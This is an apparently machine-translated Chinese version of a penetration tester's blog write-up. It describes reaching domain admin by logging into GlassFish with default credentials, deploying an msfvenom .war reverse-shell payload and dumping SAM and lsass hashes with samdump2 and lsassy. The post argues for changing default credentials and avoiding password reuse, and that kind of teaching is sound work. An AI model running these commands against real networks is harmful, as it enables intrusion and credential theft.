<html>
<head>
<title>DOMAIN ADMIN Compromise in 3 HOURS</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">3小时后域名管理受损</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/domain-admin-compromise-in-3-hours-5778902604c9?source=collection_archive---------0-----------------------#2022-05-29">https://infosecwriteups.com/domain-admin-compromise-in-3-hours-5778902604c9?source=collection_archive---------0-----------------------#2022-05-29</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><p id="f69d" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">大家好；我希望你喜欢我之前关于“<a class="ae ko" href="https://popalltheshells.medium.com/i-obtained-admin-access-via-account-activation-link-in-30-seconds-dd7f115ae1d2" rel="noopener">我如何在30秒</a>内获得管理员权限”的博文——所以今天我给你带来另一个我最近发现的<strong class="js iu"> <em class="kp">关键</em> </strong>发现；这说明了<strong class="js iu">更改默认凭证</strong>和<strong class="js iu">密码重用</strong>的重要性。</p><p id="9c95" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">—三个小时的列举和开发—</p><p id="4f35" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">首先，我们都喜欢一些枚举。通过对目标进行简单的nmap扫描，我发现了一个有趣的应用服务器，名为<strong class="js iu">Sun GlassFish Enterprise Server</strong>。经过一些调查和研究，我发现这个应用程序负责在企业环境中部署web应用程序。哇哦。好了，有了这些信息，我们知道这台服务器负责部署公司的至少一些web应用程序。通过使用我们的受信者Google，我们可以发现Sun GlassFish的默认凭证是<strong class="js iu"> admin </strong>，密码是<strong class="js iu"> adminadmin。</strong>有了这个新发现的信息；我能够获得对负责在客户环境中部署web应用程序的应用程序的管理权限。</p><p id="c200" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">对我来说最突出的一点是这个应用程序需要<strong class="js iu">。war </strong>文件；它负责分发JAR文件、JavaServer页面、Java Servlets、Java类和其他构成web应用程序(Wikipedia)的文件的集合。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi kq"><img src="../Images/3c5004093880f39c8f352cf1b458096c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*I_AAihoNqZvIyFpyKILiMg.png"/></div></div></figure><p id="9d56" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">你可能知道也可能不知道<strong class="js iu"> msfvenom </strong>可以造一个<strong class="js iu">。战争</strong>逆转HTTPS有效载荷，我就是这么做的。</p><blockquote class="lc ld le"><p id="495f" class="jq jr kp js b jt ju jv jw jx jy jz ka lf kc kd ke lg kg kh ki lh kk kl km kn im bi translated">MSF venom-p<payload>LHOST =<ip>LPORT = 443-f war &gt; payload . war</ip></payload></p></blockquote><p id="bfee" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">一旦我的恶意war文件被创建，我们需要将它上传到应用程序并“部署”它以触发受影响的服务器执行有效负载；同时，我在我的攻击机器上设置了一个监听器。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi li"><img src="../Images/05941fe35661ac9b1e9b371dd339dcc3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DmHf7T4gVskz9IBn6Tj9sg.png"/></div></div></figure><p id="5b53" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">一旦部署，我们将获得一个外壳。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi lj"><img src="../Images/79c7422a5a986f1c64dc83715655e5ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sguFHZDI0TADr_JHS791Zw.png"/></div></div></figure><p id="45ca" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">运行“whoami”命令始终是一个好习惯(当您有RCE时)。这将显示您在该系统上拥有哪些特权。在这种情况下；我非常幸运。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi lk"><img src="../Images/f0062be5bc592e1cd5bf63bc0e35722b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QGDrb4O-_rbUYYdmScx8Zg.png"/></div></div></figure><p id="d8d1" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在我们有了NT系统特权，我们几乎拥有了这个系统，可以做任何我们想做的事情。下一步是创建一个本地用户，并将该用户添加为本地管理员；通过这样做，我能够使用我新创建的本地管理员帐户RDP到受影响的服务器。</p><p id="663f" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这就是了。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi ll"><img src="../Images/8355652da581e6aacbebe011d27c0c5f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_pfTIxGgZVguQ74F54_MzQ.png"/></div></div></figure><p id="c8b3" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">就现在；我们只有一个本地管理员帐户，我们如何利用它在网络中横向移动？嗯，有很多方法可以做到这一点；但是我用了我认为最简单的方法(不是mimikatz，因为我不想触发警报)。</p><p id="783b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我想到的第一件事是获取SAM和系统文件的副本，并使用一个名为<strong class="js iu"> samdump2 </strong>的工具来获取所有其他本地帐户的NTLM哈希。然而，使用Windows GUI复制SAM和系统文件有时不起作用(当时对我不起作用)。</p><p id="c681" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这就是命令行发挥作用的地方；在CMD以管理员身份打开的情况下，我能够输入以下命令来转储SAM和系统文件。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi lm"><img src="../Images/6c131c4d61691805b1a48d20f2ac7634.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bPOhEGsTel5iSCgnXP3JXw.png"/></div></div></figure><p id="ead9" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">一旦完成，我就将这些文件过滤到我的Kali linux中并运行</p><blockquote class="lc ld le"><p id="a0b8" class="jq jr kp js b jt ju jv jw jx jy jz ka lf kc kd ke lg kg kh ki lh kk kl km kn im bi translated"><strong class="js iu"> samdump2系统SAM </strong></p></blockquote><p id="9964" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">作为回报，给了我本地管理员账户的散列。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi ln"><img src="../Images/bbee4047a0294ef1e6d84a6bf1d437b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IPZvxwwnLqNB5ZS7S23q2A.png"/></div></div></figure><p id="50c2" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">—密码重复使用是一件常见的事情，伙计们—</p><p id="1ebb" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在我们有了管理员帐户的NTLM散列，系统管理员为他们的DC和环境中的其他服务器重用相同密码的可能性有多大？</p><p id="c9c4" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">如果其他服务器有相同密码的管理员帐户，在我的Kali上使用诸如<strong class="js iu"> lsassy </strong>这样的工具允许我利用管理员哈希来转储其他用户的哈希和明文密码的lsass进程。</p><blockquote class="lc ld le"><p id="e12b" class="jq jr kp js b jt ju jv jw jx jy jz ka lf kc kd ke lg kg kh ki lh kk kl km kn im bi translated"><strong class="js iu">lsassy&lt;target IP/RANGE&gt;-u USER-m proc dump-H&lt;has H value&gt;-O proc dump _ path =&lt;到procdump64.exe的路径&gt; </strong></p></blockquote><p id="260d" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">幸运的是，其中一个服务器明文保存了一个用户的凭证；哪个属于<strong class="js iu">域管理员</strong>组</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi lo"><img src="../Images/95d0fcb0e57fee8eb2ea39cc7701b09d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IxGf8_0CCDXeGdmQGxRD5w.png"/></div></div></figure><p id="ba58" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">一旦这已经完成；接下来的步骤是清理工件，在网络中横向移动，并暴露可能“敏感”的文件，作为展示使用默认凭证和密码重用的影响的最后尝试。</p><p id="6240" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">黑客快乐！</p></div></div>    
</body>
</html>